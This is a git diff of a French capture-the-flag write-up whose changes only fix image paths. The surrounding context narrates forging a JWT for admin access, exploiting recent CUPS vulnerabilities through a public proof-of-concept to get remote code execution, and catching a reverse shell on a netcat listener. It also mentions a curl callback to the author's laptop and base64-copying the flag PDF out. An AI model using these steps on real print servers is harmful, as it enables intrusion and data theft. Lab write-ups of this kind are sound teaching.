@@ -67,7 +67,7 @@ Dans robots.txt on trouve les informations suivantes
 
 ![Image robots.txt](/HACKVENS/images/robots_text.png)
 
-![Image todo.txt](/images/todo_text.png)
+![Image todo.txt](/HACKVENS/images/todo_text.png)
 
 -------------------------------------------------------
 
@@ -87,7 +87,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoic3VwZXJ
 
 On peut maintenant refresh là page et on arrive sur ça : 
 
-![Page admin impression](test_impression.png)
+![Page admin impression](/HACKVENStest_impression.png)
 
 En entrant une adresse IP, le serveur déclenche une impression vers cette dernière. Grâce au nom de la capture réseau (cups.pcap), nous comprenons qu'il faut exploiter la / les récentes CVEs sur cups.
 En faisant quelques recherches on tombe sur le répo suivant avec un poc et une explication des CVEs : https://github.com/0xCZR1/PoC-Cups-RCE-CVE-exploit-chain
@@ -108,17 +108,17 @@ Nous tentons d'utiliser le POC de ce même répo mais sans succès : le port 631
 ```
 
 Ensuite on lance un `nc -lnvp 4444` et on trigger une impression depuis la webview vers notre laptop en `192.168.12.45` : 
-![Payload sent](/images/payload_envoye.png)
+![Payload sent](/HACKVENS/images/payload_envoye.png)
 
 On chope notre shell et un flag.txt : 
-![Fake flag](/images/false_espoir.png)
+![Fake flag](/HACKVENS/images/false_espoir.png)
 
 La solve "légit" était de relancer une impression avec un wireshark qui tourne sur notre laptopt et on extrait le pdf depuis la capture dans le IPP response : 
-![IPP response](/images/IPP_response.png)
+![IPP response](/HACKVENS/images/IPP_response.png)
 l
 Dans notre cas nous avons simplement `base64 doc/thomas-ruyant-pos.pdf` ctrl + shift + c
 Et sur notre laptop `echo -n "base64 string du pdf" | base64 -d > flag.pdf`
-![Real flag](/images/flag_final.png)
+![Real flag](/HACKVENS/images/flag_final.png)
 
 Le challenge était vraiment sympa mais seul problème les neuilles qui fuzzaient le serveur web pour rien (instance partagée qui a crashée pas mal de fois). Autre galère rencontrée : pas réussir à faire marcher le premier poc. Et je testais ma RCE avec un `python3 -m http.server 1234` en local et un payload du style `curl http://ip_laptop:1234/` mais je ne recevais rien car la machine cible n'avait pas `curl` d'installé :/
 
